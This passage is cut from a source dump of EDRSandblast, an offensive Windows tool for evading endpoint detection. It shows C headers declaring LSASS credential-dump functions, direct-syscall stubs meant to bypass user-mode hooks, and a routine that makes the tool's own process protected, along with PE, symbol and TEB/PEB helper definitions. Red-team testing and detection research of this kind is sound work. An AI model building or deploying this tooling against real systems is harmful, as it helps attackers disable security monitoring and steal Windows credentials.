	DWORD exportedNamesLength;
	LPDWORD exportedFunctions;
	LPWORD exportedOrdinals;
	//relocations info
	DWORD nbRelocations;
	PE_relocation* relocations;
	//debug info
	IMAGE_DEBUG_DIRECTORY* debugDirectory;
	PE_codeview_debug_info* codeviewDebugInfo;
} PE;

PE* PE_create(PVOID imageBase, BOOL isMemoryMapped);
PE* PE_create_from_another_address_space(HANDLE hProcess, PVOID imageBase);
PVOID PE_RVA_to_Addr(PE* pe, DWORD rva);
DWORD PE_Addr_to_RVA(PE* pe, PVOID addr);
IMAGE_SECTION_HEADER* PE_sectionHeader_fromRVA(PE* pe, DWORD rva);
IMAGE_SECTION_HEADER* PE_nextSectionHeader_fromPermissions(PE* pe, IMAGE_SECTION_HEADER* prev, INT8 readable, INT8 writable, INT8 executable);
DWORD PE_functionRVA(PE* pe, LPCSTR functionName);
PVOID PE_functionAddr(PE* pe, LPCSTR functionName);
VOID PE_parseRelocations(PE* pe);
VOID PE_rebasePE(PE* pe, LPVOID newBaseAddress);
PVOID PE_search_pattern(PE* pe, PBYTE pattern, size_t patternSize);
PVOID PE_search_relative_reference(PE* pe, PVOID target, DWORD relativeReferenceSize);
VOID PE_destroy(PE* pe);
```

`EDRSandblast/Includes/PdbSymbols.h`:

```h
#pragma once

typedef struct symbol_ctx_t {
	LPWSTR pdb_name_w;
	DWORD64 pdb_base_addr;
	HANDLE sym_handle;
} symbol_ctx;

symbol_ctx* LoadSymbolsFromImageFile(LPCWSTR image_file_path);
DWORD64 GetSymbolOffset(symbol_ctx* ctx, LPCSTR symbol_name);
DWORD GetFieldOffset(symbol_ctx* ctx, LPCSTR struct_name, LPCWSTR field_name);
void UnloadSymbols(symbol_ctx* ctx, BOOL delete_pdb);
```

`EDRSandblast/Includes/ProcessDump.h`:

```h
/*

--- LSASS dump functions.

*/

#pragma once

#include <Windows.h>

//typedef BOOL(WINAPI* _MiniDumpWriteDump)(HANDLE hProcess, DWORD ProcessId, HANDLE hFile, MINIDUMP_TYPE DumpType, PMINIDUMP_EXCEPTION_INFORMATION ExceptionParam, PMINIDUMP_USER_STREAM_INFORMATION UserStreamParam, PMINIDUMP_CALLBACK_INFORMATION CallbackParam);
typedef BOOL(WINAPI* _MiniDumpWriteDump)(HANDLE hProcess, DWORD ProcessId, HANDLE hFile, MINIDUMP_TYPE DumpType, PVOID ExceptionParam, PVOID UserStreamParam, PVOID CallbackParam);


DWORD WINAPI dumpProcess(LPTSTR processName, TCHAR* outputDumpFile);
DWORD WINAPI dumpProcessFromThread(PVOID* args);
```

`EDRSandblast/Includes/ProcessDumpDirectSyscalls.h`:

```h
#pragma once
#include <Windows.h>
#include <tchar.h>

enum ProcessorArchitecture {
    AMD64 = 9,
    INTEL = 0,
};

#if _WIN64
#define PROCESSOR_ARCHITECTURE AMD64
#define SIZE_OF_SYSTEM_INFO_STREAM 48
#else
#define PROCESSOR_ARCHITECTURE INTEL
#define SIZE_OF_SYSTEM_INFO_STREAM 56
#endif

typedef struct _DUMP_CONTEXT {
    HANDLE  hProcess;
    PVOID   BaseAddress;
    ULONG32 RVA;
    SIZE_T  DumpMaxSize;
    ULONG32 Signature;
    USHORT  Version;
    USHORT  ImplementationVersion;
} DUMP_CONTEXT, * PDUMP_CONTEXT;

DWORD SandMiniDumpWriteDump(TCHAR* targetProcessName, WCHAR* dumpFilePath);
DWORD SandMiniDumpWriteDumpFromThread(PVOID* args);

```

`EDRSandblast/Includes/RemotePEBBrowser.h`:

```h
#include <Windows.h>
#include <tchar.h>

#include "../EDRSandblast.h"
#include "Undoc.h"

typedef struct _MODULE_INFO {
    struct _MODULE_INFO* next;
    ULONG64 dllBase;
    ULONG32 ImageSize;
    WCHAR dllName[256];
    ULONG32 nameRVA;
    ULONG32 timeDateStamp;
    ULONG32 checkSum;
} MODULE_INFO, * PMODULE_INFO;

typedef struct _MEMORY_PAGE_INFO {
    struct _MEMORY_PAGE_INFO* next;
    ULONG64 startOfMemoryPage;
    ULONG64 dataSize;
    DWORD   state;
    DWORD   protect;
    DWORD   type;
} MEMORY_PAGE_INFO, * PMEMORY_PAGE_INFO;

PVOID GetRVA(ULONG_PTR baseAddress, ULONG_PTR RVA);

// Return a pointer to the target process PEB Ldr (as a pseudo LDR_DATA_TABLE_ENTRY).
PLDR_DATA_TABLE_ENTRY getPebLdrAddress(HANDLE hProcess);

// Return a module info list of loaded moduler in InMemoryOrder.
PMODULE_INFO getModulesInLdrByInMemoryOrder(HANDLE hProcess);

PMEMORY_PAGE_INFO getMemoryPagesInfo(HANDLE hProcess, BOOL filterPage);
```

`EDRSandblast/Includes/RunAsPPL.h`:

```h
/*

--- Functions to set the current process as a Protected Process (PsProtectedSignerWinTcb-Light).
--- The code to locate the EPROCESS structure is adapted from:
    http://blog.rewolf.pl/blog/?p=1683

*/

#pragma once

#include <Windows.h>

//extern union NtoskrnlOffsets ntoskrnlOffsets;



/*
* Defines the NtQuerySystemInformation function.
* Undocumented function with a signature subject to possible change in futher Windows versions.
*/
#define SystemHandleInformation 0x10
#define SystemHandleInformationBaseSize 0x1000

typedef NTSTATUS(NTAPI* _NtQuerySystemInformation)(
    ULONG SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
    );

/*
* Source: https://www.geoffchappell.com/studies/windows/km/ntoskrnl/api/ex/sysinfo/handle_table_entry.htm
*/
typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO {
    USHORT UniqueProcessId;
    USHORT CreatorBackTraceIndex;
    UCHAR ObjectTypeIndex;
    UCHAR HandleAttributes;
    USHORT HandleValue;
    PVOID Object;
    ULONG GrantedAccess;
} SYSTEM_HANDLE_TABLE_ENTRY_INFO, * PSYSTEM_HANDLE_TABLE_ENTRY_INFO;

/*
* Source: https://www.geoffchappell.com/studies/windows/km/ntoskrnl/api/ex/sysinfo/handle.htm
*/
typedef struct _SYSTEM_HANDLE_INFORMATION {
    ULONG NumberOfHandles;
    SYSTEM_HANDLE_TABLE_ENTRY_INFO Handles[1];
} SYSTEM_HANDLE_INFORMATION, * PSYSTEM_HANDLE_INFORMATION;

/*
* Defines the structures related to the process protection (EPROCESS's Protection attribute).
* Source: https://docs.microsoft.com/en-us/windows/win32/procthread/zwqueryinformationprocess
*/
typedef enum _PS_PROTECTED_TYPE {
    PsProtectedTypeNone = 0,
    PsProtectedTypeProtectedLight = 1,
    PsProtectedTypeProtected = 2
} PS_PROTECTED_TYPE, * PPS_PROTECTED_TYPE;

typedef enum _PS_PROTECTED_SIGNER {
    PsProtectedSignerNone = 0,
    PsProtectedSignerAuthenticode,
    PsProtectedSignerCodeGen,
    PsProtectedSignerAntimalware,
    PsProtectedSignerLsa,
    PsProtectedSignerWindows,
    PsProtectedSignerWinTcb,
    PsProtectedSignerWinSystem,
    PsProtectedSignerApp,
    PsProtectedSignerMax
} PS_PROTECTED_SIGNER, * PPS_PROTECTED_SIGNER;

DWORD64 GetSelfEPROCESSAddress(BOOL verbose);

int SetCurrentProcessAsProtected(BOOL verbose);

```

`EDRSandblast/Includes/SW2_Syscalls.h`:

```h
#pragma once

// Code below is adapted from @modexpblog. Read linked article for more details.
// https://www.mdsec.co.uk/2020/12/bypassing-user-mode-hooks-and-direct-invocation-of-system-calls-for-red-teams

#ifndef SW2_HEADER_H_
#define SW2_HEADER_H_

#include <windows.h>

#include "Undoc.h"

#define SW2_SEED 0xE14B0D06
#define SW2_ROL8(v) (v << 8 | v >> 24)
#define SW2_ROR8(v) (v >> 8 | v << 24)
#define SW2_ROX8(v) ((SW2_SEED % 2) ? SW2_ROL8(v) : SW2_ROR8(v))
#define SW2_MAX_ENTRIES 500
#define SW2_RVA2VA(Type, DllBase, Rva) (Type)((ULONG_PTR) DllBase + Rva)

// Typedefs are prefixed to avoid pollution.

typedef struct _SW2_SYSCALL_ENTRY
{
    DWORD Hash;
    DWORD RVA;
    DWORD SyscallNumber;
} SW2_SYSCALL_ENTRY, * PSW2_SYSCALL_ENTRY;

typedef struct _SW2_SYSCALL_LIST
{
    DWORD Count;
    SW2_SYSCALL_ENTRY Entries[SW2_MAX_ENTRIES];
} SW2_SYSCALL_LIST, * PSW2_SYSCALL_LIST;


DWORD SW2_HashSyscall(PCSTR FunctionName);
BOOL SW2_PopulateSyscallList(void);
EXTERN_C DWORD SW2_GetSyscallNumber(DWORD FunctionHash);

#ifndef InitializeObjectAttributes
#define InitializeObjectAttributes( p, n, a, r, s ) { \
        (p)->Length = sizeof( OBJECT_ATTRIBUTES );        \
        (p)->RootDirectory = r;                           \
        (p)->Attributes = a;                              \
        (p)->ObjectName = n;                              \
        (p)->SecurityDescriptor = s;                      \
        (p)->SecurityQualityOfService = NULL;             \
}
#endif

EXTERN_C NTSTATUS NtGetNextProcess(
    IN HANDLE ProcessHandle,
    IN ACCESS_MASK DesiredAccess,
    IN ULONG HandleAttributes,
    IN ULONG Flags,
    OUT PHANDLE NewProcessHandle);

EXTERN_C NTSTATUS NtQueryInformationProcess(
    IN HANDLE ProcessHandle,
    IN PROCESSINFOCLASS ProcessInformationClass,
    OUT PVOID ProcessInformation,
    IN ULONG ProcessInformationLength,
    OUT PULONG ReturnLength OPTIONAL);

EXTERN_C NTSTATUS NtClose(
    IN HANDLE Handle);

EXTERN_C NTSTATUS NtAllocateVirtualMemory(
    IN HANDLE ProcessHandle,
    IN OUT PVOID* BaseAddress,
    IN ULONG ZeroBits,
    IN OUT PSIZE_T RegionSize,
    IN ULONG AllocationType,
    IN ULONG Protect);

EXTERN_C NTSTATUS NtOpenProcess(
    OUT PHANDLE ProcessHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes,
    IN PCLIENT_ID ClientId OPTIONAL);

EXTERN_C NTSTATUS NtQueryVirtualMemory(
    IN HANDLE ProcessHandle,
    IN PVOID BaseAddress,
    IN MEMORY_INFORMATION_CLASS MemoryInformationClass,
    OUT PVOID MemoryInformation,
    IN SIZE_T MemoryInformationLength,
    OUT PSIZE_T ReturnLength OPTIONAL);

EXTERN_C NTSTATUS NtReadVirtualMemory(
    IN HANDLE ProcessHandle,
    IN PVOID BaseAddress OPTIONAL,
    OUT PVOID Buffer,
    IN SIZE_T BufferSize,
    OUT PSIZE_T NumberOfBytesRead OPTIONAL);

EXTERN_C NTSTATUS NtCreateFile(
    OUT PHANDLE FileHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes,
    OUT PIO_STATUS_BLOCK IoStatusBlock,
    IN PLARGE_INTEGER AllocationSize OPTIONAL,
    IN ULONG FileAttributes,
    IN ULONG ShareAccess,
    IN ULONG CreateDisposition,
    IN ULONG CreateOptions,
    IN PVOID EaBuffer OPTIONAL,
    IN ULONG EaLength);

EXTERN_C NTSTATUS NtWriteFile(
    IN HANDLE FileHandle,
    IN HANDLE Event OPTIONAL,
    IN PIO_APC_ROUTINE ApcRoutine OPTIONAL,
    IN PVOID ApcContext OPTIONAL,
    OUT PIO_STATUS_BLOCK IoStatusBlock,
    IN PVOID Buffer,
    IN ULONG Length,
    IN PLARGE_INTEGER ByteOffset OPTIONAL,
    IN PULONG Key OPTIONAL);

#endif
```

`EDRSandblast/Includes/SignatureOps.h`:

```h
#pragma once

#include <windows.h>
#include "winerror.h"
#include <wincrypt.h>
#include <wintrust.h>
#include <stdio.h>
#include <tchar.h>

#pragma comment(lib, "crypt32.lib")

typedef
enum _SignatureOpsError {
    E_FILE_NOT_FOUND = -2,
    E_KO = -1,
    E_SUCCESS = 0,
    E_INSUFFICIENT_BUFFER = 1,
    E_NOT_SIGNED = 2
} SignatureOpsError;
//typedef enum _signatureOpsError signatureOpsError;

/*
* Retrieves a string containing the Signers of the specificied file concatenated.
* Parameters:
*             [in] pFilePath: path the file.
*             [out] outSigners: out string that will contain the concatenated Signers. If outSigners is NULL, szOutSigners will contain the number of TCHAR required for the output string (termination included).
*             [in,out] szOutSigners: length of outSigners. If szOutSigners is too small, szOutSigners will contain the number of TCHAR required for the output string (termination included).
*/
SignatureOpsError GetFileSigners(TCHAR* pFilePath, TCHAR* outSigners, size_t* szOutSigners);
```

`EDRSandblast/Includes/StringUtils.h`:

```h
#pragma once

#include <Windows.h>
#include <Tchar.h>

#include "Undoc.h"
#include "time.h"

VOID getUnicodeStringFromTCHAR(OUT PUNICODE_STRING unicodeString, IN WCHAR* tcharString);

TCHAR* generateRandomString(TCHAR* str, size_t size);
TCHAR* allocAndGenerateRandomString(size_t length);
```

`EDRSandblast/Includes/SyscallProcessUtils.h`:

```h
#pragma once
#include <Windows.h>
#include <tchar.h>

#include "../EDRSandblast.h"
#include "SW2_Syscalls.h"

#define ProcessImageFileName 27

DWORD SandGetProcessPID(HANDLE hProcess);

PUNICODE_STRING SandGetProcessImage(HANDLE hProcess);

DWORD SandGetProcessFilename(PUNICODE_STRING ProcessImageUnicodeStr, TCHAR* ImageFileName, DWORD  nSize);

DWORD SandFindProcessPidByName(TCHAR* targetProcessName, DWORD* pPid);
```

`EDRSandblast/Includes/Syscalls.h`:

```h
#pragma once
#include <Windows.h>

PVOID CreateSyscallStubWithVirtuallAlloc(LPCSTR ntFunctionName);
```

`EDRSandblast/Includes/Undoc.h`:

```h
#pragma once
//
// [TEB/PEB/SEH SUMMARY]
// This file contains the undocumented TEB (Thread Environment Block) and PEB (Process Environment Block)
// definitions for the Intel x86 32-bit Windows operating systems starting from NT 3.51 through Windows 10.  The TEB
// is also known as the TIB (Thread Information Block), especially under the Windows 9.x operating systems.
//
// Additionally I have added the definitions for the partially documented Win32 SEH (Structured Exception Handling)
// that are not only referenced by the TEB, but are normally strewn across both C headers and assembler includes.
// These definitions also include the constants specific to the Visual C++ compiler's implementation of Win32
// SEH beyond the facilities provided by the Windows operating systems.  The TEB and PEB are declared near the
// bottom of this file, with all referenced structures recursively defined above them for completeness sake.
//
// Should you be writing low level code, you might find all of these definitions in one spot a handy reference.  If
// you wanted to use this C header file in your own code, you'd probably want to remove the redundant definitions
// (almost all except for the TEB and PEB structures) as they are defined automatically as a result of including
// windows.h.  If you won't be including windows.h or are compiling with GCC under Linux, no changes are
// necessary.
//
// [WINDOWS COMPATIBILITY]
// Both the TEB and PEB structures support Windows NT 3.51 thru Windows 10
//
// [HOW TO ACCESS THESE STRUCTURES]
// The pointers to these structures can be obtained using the following x86 assembly code:
//      mov eax, fs:[18h]   //eax = TEB
//      mov eax, fs:[30h]   //eax = PEB
//
// Or, by using the following Visual C++ compiler intrinsics:
//      void* pTeb = __readfsdword(0x18);
//      void* pPeb = __readfsdword(0x30);
//
// [BUGS]
// This header file is meant mostly for documentation purposes as an alternative to the various tables found
// online; therefore it may contain bugs such that certain members might not be at the offsets stated in the
// comments because I may have forgotten to pad prior members so that everything lines up.  However, I did attempt
// to have all the members line up as documented by each member's offset (see comment to right of each member), so
// please report any bugs or additions to: http://bytepointer.com/contact.htm
//
// [STYLE USED IN THIS FILE]
// I modified the structures included in this file either from the original official forms found in the Windows
// headers or from various sources online, although the result is functionally equivalent.  The modifications were
// made according to the following scheme for simplicity and clarity:
//
// - array size values are in hex (base-16)
//
// - I avoided creating extraneous pointer types either standalone or as part of the trailing portions of structure
//  definitions.  These take the format Pxxxx where xxxx is the type. Microsoft has historically declared Pxxxx
//  definitions for practically every Windows structure in place of the type identifier with a trailing asterisk.
//  I've always found the trailing asterisk signifying a pointer type to be clearer than the Pxxxx alternative
//  because you can quickly spot them at a glance (especially when syntax hilighting kicks in).
//
// - Windows headers use many aliases for 8, 16, 32 and 64-bit values (UCHAR, ULONG, ULONG_PTR, LONG, LONGLONG, etc.)
//   which are inconsistent at times. I tend to prefer the explicitly specific assembler names: BYTE, WORD, DWORD and
//   QWORD as they are more platform independent names for unsigned values.  Any signed integer type consisting of
//   the term LONG (especially the recursive LONGLONG) just makes me cringe because I don't feel they convey size
//   very well. My naming scheme is therefore:
//
//     BYTE-SIZE                      1     2       4         8
//     unsigned integer types:     BYTE, WORD,  DWORD and QWORD
//     signed integer types:       CHAR, INT16, INT32 and INT64
//
// NOTE: void* and DWORD may be used interchangeably on 32-bit operating systems, however I attempted
//       to use void* (or typed structure pointer where possible) where I was sure the member was to
//       hold a pointer.  Otherwise and where members were to hold padding ints (of any size), I
//       avoided the use of pointer types even when originally declared to be of type PVOID. Also I
//       retained the use of some aliases, such as BOOLEAN, NTSTATUS, HANDLE, etc. only for the
//       purpose of preserving the meaning of the associated structure members.
//
// [MICROSOFT FIRST DOCUMENTS THE TEB and PEB]
// Starting with the release of Visual Studio .NET (2002), Microsoft released a new header, winternl.h
// with the Platform SDK. Within this new header was the first public documentation for the TEB and PEB.
// Microsoft, being legally forced to disclose this information, only released 2 members of the PEB
// (BeingDebugged,SessionId) and 3 members of the TEB (TlsSlots,ReservedForOle,TlsExpansionSlots).
// The original portion of the winternl.h header file is shown below along with Microsoft's usual stern
// warnings about not using these fields because Windows might change.
//
//      //
//      // The PEB and TEB structures are subject to changes between Windows
//      // releases, thus the fields offsets may change as well as the Reserved
//      // fields.  The Reserved fields are reserved for use only by the Windows
//      // operating systems.  Do not assume a maximum size for the structures.
//      //
//
//      // Instead of using the BeingDebugged field, use the Win32 APIs
//      //     IsDebuggerPresent, CheckRemoteDebuggerPresent
//      // Instead of using the SessionId field, use the Win32 APIs
//      //     GetCurrentProcessId and ProcessIdToSessionId
//      // Sample x86 assembly code that gets the SessionId (subject to change
//      //     between Windows releases, use the Win32 APIs to make your application
//      //     resilient to changes)
//      //     mov     eax,fs:[00000018]
//      //     mov     eax,[eax+0x30]
//      //     mov     eax,[eax+0x1d4]
//      //
//      typedef struct _PEB {
//          BYTE Reserved1[2];
//          BYTE BeingDebugged;
//          BYTE Reserved2[229];
//          PVOID Reserved3[59];
//          ULONG SessionId;
//      } PEB, *PPEB;
//
//      // Instead of using the Tls fields, use the Win32 TLS APIs
//      //     TlsAlloc, TlsGetValue, TlsSetValue, TlsFree
//      //
//      // Instead of using the ReservedForOle field, use the COM API
//      //     CoGetContextToken
//      //
//      typedef struct _TEB {
//          BYTE Reserved1[1952];
//          PVOID Reserved2[412];
//          PVOID TlsSlots[64];
//          BYTE Reserved3[8];
//          PVOID Reserved4[26];
//          PVOID ReservedForOle;  // Windows 2000 only
//          PVOID Reserved5[4];
//          PVOID TlsExpansionSlots;
//      } TEB;
//      typedef TEB *PTEB;
//
// [REFERENCES]
// The information below was compiled from various sources:
//    http://www.geoffchappell.com/studies/windows/win32/ntdll/structs/teb/index.htm
//    http://www.geoffchappell.com/studies/windows/win32/ntdll/structs/peb/index.htm
//    http://terminus.rewolf.pl/terminus/structures/ntdll/_TEB32_x86.html
//    https://en.wikipedia.org/wiki/Win32_Thread_Information_Block
//    http://www.nirsoft.net/kernel_struct/vista/index.html
//    Microsoft's Platform SDK headers / MSDN
//
// [CHANGELIST]
//    2018-10-23:   -bugfix: PEB_LDR_DATA struct had "Initialized" member as one BYTE instead of array of 4 BYTE's; also added offsets
//
//    2018-09-17:   -extended PEB for some Win10 members: TppWorkerpListLock, TppWorkerpList, WaitOnAddressHashTable
//
//    2018-04-14:   -offset 0x3 into PEB structure contained a byte bitfield whose last member (SpareBits) erroneously used two bits instead of one;
//                   this caused the bitfield to occupy an extra byte to fit 9 bits; this member has been fixed and now occupies 1 bit.
//                   credit: Chris Eagle
//
//    2018-05-02:   -now can be compiled alongside windows.h (without changes) or by defining WANT_ALL_WINDOWS_H_DEFINITIONS so this file can be used standalone
//                  -this file may also be included alongside tebpeb64.h which can be found at http://bytepointer.com/resources/tebpeb64.h
//                  -increased PEB size to 0x258 for [at least] Windows 10: member addition dwSystemCallMode at offset 0x254
//                   REFERENCE: https://www.malwaretech.com/2015/07/windows-10-system-call-stub-changes.html
//
//    2017-07-29:   initial public release (first stable version)
//

//disable some Visual C++ warnings
#ifdef _MSC_VER
//when compiling as C
#pragma warning (disable:4214) //Warning Level 4: C4214: nonstandard extension used : bit field types other than int
#pragma warning (disable:4201) //Warning Level 4: C4201: nonstandard extension used: nameless struct/union

//"#pragma pack(1)" not needed as Microsoft has designed all structure members to be on natural boundaries

#ifndef STDCALL
#define STDCALL         __stdcall
#endif
#ifndef CDECL
#define CDECL           __cdecl
#endif
#else
//assume GCC
#ifndef STDCALL
#define STDCALL         __attribute__ ((stdcall))
#endif
#ifndef CDECL
#define CDECL           __attribute__ ((cdecl))
#endif
#endif

#include <windows.h>
//UNCOMMENT line below if you are not including windows.h
//#define WANT_ALL_WINDOWS_H_DEFINITIONS
#ifdef WANT_ALL_WINDOWS_H_DEFINITIONS


//
// Base types
//

typedef unsigned char           BYTE;
typedef char                    CHAR;
typedef unsigned short          WORD;
typedef short                   INT16;
typedef unsigned long           DWORD;
typedef long                    INT32;
typedef BYTE                    BOOLEAN;
typedef void* HANDLE;
typedef WORD                    WCHAR;
typedef DWORD                   LCID;
typedef DWORD                   KAFFINITY;

#endif //#ifdef WANT_ALL_WINDOWS_H_DEFINITIONS


//always declare NTSTATUS and 64-bit types
//typedef INT32                   NTSTATUS;

#ifdef _MSC_VER
//Visual C++
typedef unsigned __int64    QWORD;
typedef __int64             INT64;
#else
//GCC
typedef unsigned long long  QWORD;
typedef long long           INT64;
#endif


#ifdef WANT_ALL_WINDOWS_H_DEFINITIONS

//
// General-purpose structures
//

typedef union _LARGE_INTEGER
{
	struct
	{
		DWORD   LowPart;
		INT32   HighPart;
	} u;
	INT64       QuadPart;
} LARGE_INTEGER;

typedef union _ULARGE_INTEGER
{
	struct
	{
		DWORD LowPart;
		DWORD HighPart;
	} u;
	QWORD QuadPart;
} ULARGE_INTEGER;

typedef struct _GUID
{
	DWORD   Data1;
	WORD    Data2;
	WORD    Data3;
	BYTE    Data4[8];
} GUID;

typedef struct LIST_ENTRY LIST_ENTRY;
struct LIST_ENTRY
{
	LIST_ENTRY* Flink;
	LIST_ENTRY* Blink;
};

typedef struct RTL_CRITICAL_SECTION RTL_CRITICAL_SECTION;

typedef struct _RTL_CRITICAL_SECTION_DEBUG
{
	WORD                    Type;
	WORD                    CreatorBackTraceIndex;
	RTL_CRITICAL_SECTION* CriticalSection;
	LIST_ENTRY              ProcessLocksList;
	DWORD                   EntryCount;
	DWORD                   ContentionCount;
	DWORD                   Flags;
	WORD                    CreatorBackTraceIndexHigh;
	WORD                    SpareUSHORT;
} RTL_CRITICAL_SECTION_DEBUG;

struct RTL_CRITICAL_SECTION
{
	RTL_CRITICAL_SECTION_DEBUG* DebugInfo;
	INT32                       LockCount;
	INT32                       RecursionCount;
	HANDLE                      OwningThread;
	HANDLE                      LockSemaphore;
	DWORD                       SpinCount;
};
#endif //WANT_ALL_WINDOWS_H_DEFINITIONS


typedef struct _CLIENT_ID
{
	HANDLE  ProcessId;
	HANDLE  ThreadId;
} CLIENT_ID, * PCLIENT_ID;

//typedef struct _CLIENT_ID
//{
//	HANDLE UniqueProcess;
//	HANDLE UniqueThread;
//} CLIENT_ID, * PCLIENT_ID;

/*
typedef struct _PROCESSOR_NUMBER
{
	WORD    Group;
	BYTE    Number;
	BYTE    Reserved;
} PROCESSOR_NUMBER;
*/

typedef struct _STRING
{
	WORD    Length;
	WORD    MaximumLength;
	CHAR*   Buffer;
} STRING;

typedef struct _UNICODE_STRING
{
	WORD    Length;
	WORD    MaximumLength;
	WCHAR*  Buffer;
} UNICODE_STRING, * PUNICODE_STRING;

//
// Exception-specific structures and definitions
//

//context flags
//#define CONTEXT_i386                    0x00010000                      // this assumes that i386 and
//#define CONTEXT_i486                    0x00010000                      // i486 have identical context records
//#define CONTEXT_CONTROL                 (CONTEXT_i386 | 0x00000001L)    // SS:SP, CS:IP, FLAGS, BP
//#define CONTEXT_INTEGER                 (CONTEXT_i386 | 0x00000002L)    // AX, BX, CX, DX, SI, DI
//#define CONTEXT_SEGMENTS                (CONTEXT_i386 | 0x00000004L)    // DS, ES, FS, GS
//#define CONTEXT_FLOATING_POINT          (CONTEXT_i386 | 0x00000008L)    // 387 state
//#define CONTEXT_DEBUG_REGISTERS         (CONTEXT_i386 | 0x00000010L)    // DB 0-3,6,7
//#define CONTEXT_EXTENDED_REGISTERS      (CONTEXT_i386 | 0x00000020L)    // cpu specific extensions
//#define CONTEXT_FULL                    (CONTEXT_CONTROL | CONTEXT_INTEGER | CONTEXT_SEGMENTS)
//#define CONTEXT_ALL                     (CONTEXT_CONTROL | CONTEXT_INTEGER | CONTEXT_SEGMENTS | CONTEXT_FLOATING_POINT | CONTEXT_DEBUG_REGISTERS | CONTEXT_EXTENDED_REGISTERS)

//exception flags
#define EXCEPTION_NONCONTINUABLE        0x1     // Noncontinuable exception
#define EXCEPTION_UNWINDING             0x2     // Unwind is in progress; same as EH_UNWINDING
#define EXCEPTION_EXIT_UNWIND           0x4     // Exit unwind is in progress; same as EH_EXIT_UNWIND
#define EXCEPTION_STACK_INVALID         0x8     // Stack out of limits or unaligned
#define EXCEPTION_NESTED_CALL           0x10    // Nested exception handler call
#define EXCEPTION_TARGET_UNWIND         0x20    // Target unwind in progress
#define EXCEPTION_COLLIDED_UNWIND       0x40    // Collided exception handler call
#define EXCEPTION_UNWIND                (EXCEPTION_UNWINDING | EXCEPTION_EXIT_UNWIND | EXCEPTION_TARGET_UNWIND | EXCEPTION_COLLIDED_UNWIND)
#define IS_UNWINDING(Flag)              ((Flag & EXCEPTION_UNWIND) != 0)
#define IS_DISPATCHING(Flag)            ((Flag & EXCEPTION_UNWIND) == 0)
#define IS_TARGET_UNWIND(Flag)          (Flag & EXCEPTION_TARGET_UNWIND)

//msvc exception filter expression return codes
#define EXCEPTION_EXECUTE_HANDLER       1   //same as FILTER_ACCEPT
#define EXCEPTION_CONTINUE_SEARCH       0   //same as FILTER_CONTINUE_SEARCH
//#define EXCEPTION_CONTINUE_EXECUTION    -1  //same as FILTER_DISMISS

#ifdef WANT_ALL_WINDOWS_H_DEFINITIONS

//exception handler (disposition) return values
typedef enum _EXCEPTION_DISPOSITION
{
	ExceptionContinueExecution,         //0; same as DISPOSITION_DISMISS, _XCPT_CONTINUE_EXECUTION
	ExceptionContinueSearch,            //1; same as DISPOSITION_CONTINUE_SEARCH, _XCPT_CONTINUE_SEARCH
	ExceptionNestedException,           //2; same as DISPOSITION_NESTED_EXCEPTION
	ExceptionCollidedUnwind             //3; same as DISPOSITION_COLLIDED_UNWIND
} EXCEPTION_DISPOSITION;

#define EXCEPTION_MAXIMUM_PARAMETERS 15
typedef struct EXCEPTION_RECORD EXCEPTION_RECORD;
struct EXCEPTION_RECORD //size=0x50
{
	DWORD               ExceptionCode;                                          //0x00
	DWORD               ExceptionFlags;                                         //0x04 - see possible values above
	EXCEPTION_RECORD* ExceptionRecord;                                        //0x08
	void* ExceptionAddress;                                       //0x0C
	DWORD               NumberParameters;                                       //0x10
	DWORD               ExceptionInformation[EXCEPTION_MAXIMUM_PARAMETERS];     //0x14
};

#define SIZE_OF_80387_REGISTERS 80
typedef struct _FLOATING_SAVE_AREA //size=0x70
{
	DWORD   ControlWord;                                //0x00
	DWORD   StatusWord;                                 //0x04
	DWORD   TagWord;                                    //0x08
	DWORD   ErrorOffset;                                //0x0C
	DWORD   ErrorSelector;                              //0x10
	DWORD   DataOffset;                                 //0x14
	DWORD   DataSelector;                               //0x18
	BYTE    RegisterArea[SIZE_OF_80387_REGISTERS];      //0x1C
	DWORD   Cr0NpxState;                                //0x6C
} FLOATING_SAVE_AREA;

#define MAXIMUM_SUPPORTED_EXTENSION 512
typedef struct _CONTEXT //size=0x2CC
{
	//determines which groups of members are valid
	DWORD               ContextFlags;                                       //0x00 - see possible values above
																			//following member group valid when CONTEXT_DEBUG_REGISTERS set
	DWORD               Dr0;                                                //0x04
	DWORD               Dr1;                                                //0x08
	DWORD               Dr2;                                                //0x0C
	DWORD               Dr3;                                                //0x10
	DWORD               Dr6;                                                //0x14
	DWORD               Dr7;                                                //0x18
																			//following member valid when CONTEXT_FLOATING_POINT set
	FLOATING_SAVE_AREA  FloatSave;                                          //0x1C
																			//following member group valid when CONTEXT_SEGMENTS set
	DWORD               SegGs;                                              //0x8C
	DWORD               SegFs;                                              //0x90
	DWORD               SegEs;                                              //0x94
	DWORD               SegDs;                                              //0x98
																			//following member group valid when CONTEXT_INTEGER set
	DWORD               Edi;                                                //0x9C
	DWORD               Esi;                                                //0xA0
	DWORD               Ebx;                                                //0xA4
	DWORD               Edx;                                                //0xA8
	DWORD               Ecx;                                                //0xAC
	DWORD               Eax;                                                //0xB0
																			//following member group valid when CONTEXT_CONTROL set
	DWORD               Ebp;                                                //0xB4
	DWORD               Eip;                                                //0xB8
	DWORD               SegCs;                                              //0xBC
	DWORD               EFlags;                                             //0xC0
	DWORD               Esp;                                                //0xC4
	DWORD               SegSs;                                              //0xC8
																			//following member valid when CONTEXT_EXTENDED_REGISTERS set
	BYTE                ExtendedRegisters[MAXIMUM_SUPPORTED_EXTENSION];     //0xCC
} CONTEXT;

//used with UnhandledExceptionFilter()/SetUnhandledExceptionFilter() and newer Vectored Exception handling functions
typedef struct _EXCEPTION_POINTERS
{
	EXCEPTION_RECORD* ExceptionRecord;
	CONTEXT* ContextRecord;
} EXCEPTION_POINTERS;

#endif //WANT_ALL_WINDOWS_H_DEFINITIONS

typedef struct EXCEPTION_REGISTRATION EXCEPTION_REGISTRATION;

//dispatcher context is reserved for exception handler implementation (e.g. compilers)
typedef struct _DISPATCHER_CONTEXT_und
{
	EXCEPTION_REGISTRATION* RegistrationPointer;
} DISPATCHER_CONTEXT_und;

//exception handler signatures
